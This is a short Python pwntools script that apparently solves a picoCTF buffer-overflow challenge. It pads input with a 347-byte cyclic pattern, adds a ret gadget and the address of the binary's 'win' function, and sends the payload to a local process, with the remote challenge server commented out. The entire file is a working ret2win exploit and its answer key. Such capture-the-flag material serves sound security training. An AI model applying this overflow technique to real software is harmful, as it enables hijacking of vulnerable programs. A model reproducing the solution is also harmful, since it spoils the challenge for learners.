#!/usr/bin/python3

from pwn import *

elf = ELF('vuln')

io = process('./vuln')

#io = remote('saturn.picoctf.net' ,57558)

ret = 0x000000000040101a
payload = cyclic(347) + p64(ret) + p64(elf.sym.win)   #info address win 

io.sendline(payload)

io.interactive()
